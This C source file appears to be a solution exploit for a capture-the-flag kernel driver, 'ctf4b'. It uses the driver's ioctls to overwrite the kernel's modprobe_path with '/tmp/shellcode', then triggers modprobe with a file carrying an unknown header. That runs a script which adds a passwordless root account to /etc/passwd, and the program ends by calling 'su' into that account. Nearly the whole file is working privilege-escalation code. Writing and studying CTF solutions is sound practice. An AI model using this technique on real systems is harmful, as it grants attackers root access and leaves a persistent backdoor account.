#include "../src/ctf4b.h"
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

unsigned long user_cs, user_ss, user_rsp, user_rflags;
unsigned long modprobe_addr = 0xffffffff81e3a080;

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

int main() {
  char *buf;
  int fd;

  fd = open("/dev/ctf4b", O_RDWR);
  if (fd == -1)
    fatal("/dev/ctf4b");

  buf = (char*)malloc(CTF4B_MSG_SIZE);
  if (!buf) {
    close(fd);
    fatal("malloc");
  }

  /* Get message */
  // memset(buf, 0, CTF4B_MSG_SIZE);
  // ioctl(fd, CTF4B_IOCTL_LOAD, buf);
  // printf("Message from ctf4b: %s\n", buf);

  /* Update message */
  memset(buf, 0, CTF4B_MSG_SIZE);
  strcpy(buf, "/tmp/shellcode");
  ioctl(fd, CTF4B_IOCTL_STORE, buf);

  /* Get message again */
  ioctl(fd, CTF4B_IOCTL_LOAD, modprobe_addr);

  system("echo -e '#!/bin/sh\\necho cafe::0:0::/root:/bin/sh >> /etc/passwd' > /tmp/shellcode");
  system("chmod +x /tmp/shellcode");
  system("echo -e '\xca\xff\xe1\x2e' > /tmp/cafe");
  system("chmod +x /tmp/cafe");
  system("/tmp/cafe");
  system("su cafe -");

  free(buf);
  close(fd);
  return 0;
}
